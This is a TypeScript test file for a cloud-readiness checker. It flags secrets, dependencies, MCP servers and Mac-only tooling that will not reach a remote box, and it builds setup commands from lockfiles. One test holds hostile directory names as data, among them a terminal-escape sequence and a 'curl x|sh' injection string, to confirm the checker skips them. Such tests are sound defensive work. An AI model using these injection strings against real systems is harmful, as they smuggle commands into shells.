import { afterEach, describe, expect, test } from "bun:test";
import { execFileSync } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { cloudReadiness, gitProbe, isSecretName, setupSteps } from "./readiness";

const dirs: string[] = [];
afterEach(() => { for (const d of dirs.splice(0)) { try { chmodSync(d, 0o700); } catch { /* */ } rmSync(d, { recursive: true, force: true }); } });
const tmp = (): string => { const d = mkdtempSync(join(tmpdir(), "nomo-ready-")); dirs.push(d); return d; };
const put = (root: string, files: Record<string, string>): void => {
  for (const [p, body] of Object.entries(files)) { mkdirSync(dirname(join(root, p)), { recursive: true }); writeFileSync(join(root, p), body); }
};
const git = (root: string, ...args: string[]) => execFileSync("git", ["-c", "user.name=t", "-c", "user.email=t@example.com", ...args], { cwd: root, stdio: "ignore" });
const repo = (files: Record<string, string>, track: string[] = []): string => {
  const r = tmp();
  git(r, "init", "-q");
  put(r, files);
  if (track.length) { git(r, "add", "-f", ...track); git(r, "commit", "-qm", "x"); }
  return r;
};
const check = (root: string, home = tmp(), extra = {}) => cloudReadiness(root, { home, git: gitProbe(root), ...extra });

describe("isSecretName", () => {
  test("env files and key material yes, templates no", () => {
    for (const n of [".env", ".env.local", ".env.production", ".dev.vars", ".envrc", "credentials.json", "cert.pem", "AuthKey.p8", "service-account-prod.json", "id_rsa", "secrets.yaml"]) expect(isSecretName(n)).toBe(true);
    for (const n of [".env.example", ".env.sample", ".env.template", "env.ts", "package.json", "keys.ts", "README.md"]) expect(isSecretName(n)).toBe(false);
  });
});

describe("cloudReadiness", () => {
  test("empty project: nothing Mac-only", () => {
    expect(check(repo({}))).toBe("Cloud check: nothing Mac-only spotted.");
    expect(cloudReadiness(tmp(), { home: tmp() })).toBe("Cloud check: nothing Mac-only spotted.");
  });

  test("ignored secrets are listed by name and never sent; contents never surface", () => {
    const r = repo({ ".gitignore": ".env*\n!.env.example\n", ".env": "TOKEN=hunter2", ".env.local": "X=hunter2", ".env.example": "TOKEN=" }, [".gitignore"]);
    const out = check(r);
    expect(out).toContain("Won't be on the box: .env, .env.local (2 files, never sent)");
    expect(out).not.toContain("hunter2");
    expect(out).not.toContain(".env.example");
    expect(out).not.toContain("WILL");
  });

  test("a tracked secret warns it WILL be on the box; an untracked unignored one is never sent (the tar drops it)", () => {
    const r = repo({ "credentials.json": "{}", "key.pem": "x" }, ["credentials.json"]);
    const out = check(r);
    expect(out).toContain("credentials.json looks like a secret and is tracked in git: it WILL be on the box.");
    expect(out).toContain("key.pem (1 file, never sent)");
    expect(out).not.toContain("key.pem looks like");
  });

  test("non-git folder: secrets and node_modules stay behind", () => {
    const d = tmp();
    put(d, { ".env": "A=1", "node_modules/x/index.js": "", "build/out.js": "", "bun.lock": "" });
    const out = cloudReadiness(d, { home: tmp() });
    expect(out).toContain("node_modules (box must reinstall: bun install)");
    expect(out).not.toContain("build");
    expect(out).toContain(".env (1 file, never sent)");
    expect(out).not.toContain("WILL");
  });

  test("ignored deps/builds with their setup command; tracked vendor/ is not listed", () => {
    const r = repo({
      ".gitignore": "node_modules/\n.venv\ntarget\n", "node_modules/a/i.js": "", "package-lock.json": "{}",
      ".venv/bin/python": "", "uv.lock": "", "server/target/x": "", "server/Cargo.lock": "", "vendor/lib.go": "",
    }, [".gitignore", "vendor/lib.go"]);
    const out = check(r);
    expect(out).toContain(".venv, node_modules, target (box must reinstall: npm ci, uv sync, cargo build)");
    expect(out).not.toContain("vendor");
  });

  test("ignored nested repos are not in the bundle; an untracked unignored one rides in the tar", () => {
    const r = repo({ ".gitignore": "nomo/\n", "README.md": "" }, [".gitignore", "README.md"]);
    for (const n of ["nomo", "loose"]) { mkdirSync(join(r, n)); git(join(r, n), "init", "-q"); }
    const out = check(r);
    expect(out).toContain("nomo (nested repo/submodule, not in the bundle)");
    expect(out).not.toContain("loose");
  });

  test("MCP servers by name only (project .mcp.json, user + project scope), other plugins, never values", () => {
    const r = repo({ ".mcp.json": JSON.stringify({ mcpServers: { linear: { env: { KEY: "hunter2" } } } }) });
    const home = tmp();
    put(home, {
      ".claude.json": JSON.stringify({ mcpServers: { figma: { headers: { Authorization: "hunter2" } } }, projects: { [r]: { mcpServers: { db: { args: ["hunter2"] } } }, "/elsewhere": { mcpServers: { other: {} } } } }),
      ".claude/settings.json": JSON.stringify({ enabledPlugins: { "nomo-cc@nomo": true, "codex@openai": true, "off@x": false } }),
    });
    const out = check(r, home);
    expect(out).toContain("3 MCP servers (linear, figma, db)");
    expect(out).toContain("1 other plugin (codex)");
    expect(out).not.toContain("hunter2");
    expect(out).not.toContain("other)");
  });

  test("unreadable, broken or oversized ~/.claude.json is skipped silently", () => {
    const r = repo({});
    const broken = tmp(); put(broken, { ".claude.json": "{not json" });
    expect(check(r, broken)).toBe("Cloud check: nothing Mac-only spotted.");
    const locked = tmp(); put(locked, { ".claude.json": JSON.stringify({ mcpServers: { a: {} } }) }); chmodSync(join(locked, ".claude.json"), 0);
    expect(check(r, locked)).not.toContain("MCP");
    const big = tmp();
    expect(check(r, big, { readText: () => undefined })).toBe("Cloud check: nothing Mac-only spotted.");
    expect(check(r, big, { readText: () => { throw new Error("EACCES"); } })).toBe("Cloud check: nothing Mac-only spotted.");
  });

  test("Mac-only tooling: Xcode, iOS package, compose, localhost in config (never in .env)", () => {
    const r = repo({
      "App.xcodeproj/project.pbxproj": "", "Package.swift": "platforms: [.iOS(.v18)]",
      "docker-compose.yml": "services:\n  db:\n    image: postgres\n", "wrangler.toml": 'url = "http://localhost:8787"',
      ".env": "API=http://127.0.0.1", "secrets.yaml": "db: localhost", ".github/workflows/ci.yml": "url: localhost", "pnpm-lock.yaml": "localhost",
    });
    const out = check(r);
    expect(out).toContain("Xcode project");
    expect(out).toContain("iOS Swift package");
    expect(out).toContain("Docker Compose (docker-compose.yml)");
    expect(out).toContain("localhost services (wrangler.toml)"); // not secrets.yaml: a secret is never opened
  });

  test("GitHub remote: gh isn't logged in on the box", () => {
    const r = repo({});
    git(r, "remote", "add", "origin", "git@github.com:someone/thing.git");
    expect(check(r)).toBe("Cloud check: fine for code edits and tests. Won't be on the box: gh login (GitHub remote). Anything needing those will stall.");
  });

  test("a huge tree stays bounded and fast", () => {
    const d = tmp();
    for (let i = 0; i < 60; i++) for (let j = 0; j < 60; j++) put(d, { [`a${i}/b${j}/f.txt`]: "" });
    put(d, { "a59/b59/.env": "" }); // beyond the budget: not seen
    const t = performance.now();
    const out = cloudReadiness(d, { home: tmp(), maxEntries: 500 });
    expect(performance.now() - t).toBeLessThan(200);
    expect(out).toBe("Cloud check: nothing Mac-only spotted.");
  });
});

describe("setupSteps (NOM-106: from lockfiles + compose only)", () => {
  test("one install per lockfile dir, one JS manager per dir, compose listed not started, quoted dirs", () => {
    const r = tmp();
    put(r, {
      "bun.lock": "", "package-lock.json": "", "uv.lock": "", "docker-compose.yml": "services: {}",
      "web app/yarn.lock": "", "node_modules/x/pnpm-lock.yaml": "", ".env": "SECRET=1",
    });
    expect(setupSteps(r)).toEqual({ install: ["bun install", "uv sync", "(cd 'web app' && yarn install)"], compose: ["docker-compose.yml"] });
  });

  test("a session started in a subdirectory: steps are relative to it (.. up to the root)", () => {
    const r = tmp();
    put(r, { "bun.lock": "", "apps/web/pnpm-lock.yaml": "", "apps/api/uv.lock": "", "compose.yml": "" });
    expect(setupSteps(r, join(r, "apps", "web"))).toEqual({
      install: ["(cd '../..' && bun install)", "(cd '../api' && uv sync)", "pnpm install"],
      compose: ["../../compose.yml"],
    });
  });

  test("hostile dir/file names are skipped, never typed into the box", () => {
    const r = tmp();
    const bad = ["e\u001b[201~\r!id", "n\nl", "a`; curl x|sh; `", "-", "-rf", "it's"];
    put(r, Object.fromEntries([...bad.map((d) => [`${d}/bun.lock`, ""]), ["ok/bun.lock", ""], ["compose.\u001bx.yml", ""], ["sub/-/compose.yml", ""], ["compose.yaml", ""]]));
    expect(setupSteps(r)).toEqual({ install: ["(cd 'ok' && bun install)"], compose: ["compose.yaml"] });
  });

  test("nothing detected → empty; capped", () => {
    expect(setupSteps(tmp())).toEqual({ install: [], compose: [] });
    const r = tmp();
    put(r, Object.fromEntries(Array.from({ length: 12 }, (_, i) => [`p${String(i).padStart(2, "0")}/bun.lock`, ""])));
    expect(setupSteps(r).install).toHaveLength(8);
  });
});
